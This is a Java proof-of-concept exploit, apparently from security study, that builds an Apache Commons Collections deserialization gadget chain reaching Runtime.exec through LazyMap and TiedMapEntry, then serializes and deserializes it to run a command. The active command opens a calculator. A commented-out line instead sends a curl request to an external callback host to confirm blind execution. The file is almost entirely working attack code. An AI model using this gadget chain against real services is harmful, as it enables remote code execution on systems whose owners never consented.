import com.sun.net.httpserver.Filter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.Base64;
import java.util.HashMap;

public class FinalEXP {
    public static void main(String[] args) throws Exception {
        HashMap<Object,Object> hashMap = new HashMap<>();
        String cmd = "/usr/bin/gnome-calculator";
//        cmd = "curl http://4lokvhgm.eyes.sh";

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getDeclaredMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{cmd}
                )
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,new ConstantTransformer(666));
//        lazyMap.get(Runtime.class);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");
        HashMap<Object,Object> testHashMap = new HashMap<>();
        testHashMap.put(tiedMapEntry,"bbb");
        System.out.println("[+] Debugging: " + hashMap.toString());
        hashMap.remove("aaa");
        System.out.println("[+] Debugging: " + hashMap.toString());

        Class c = LazyMap.class;
        Field fieldfactory = c.getDeclaredField("factory");
        fieldfactory.setAccessible(true);
        fieldfactory.set(lazyMap,chainedTransformer);

        serialize(testHashMap);
        deserialize("ser.bin");
    }

    public static void serialize(Object o) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(o);
    }
    public static Object deserialize(String fileName) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        return ois.readObject();
    }
}
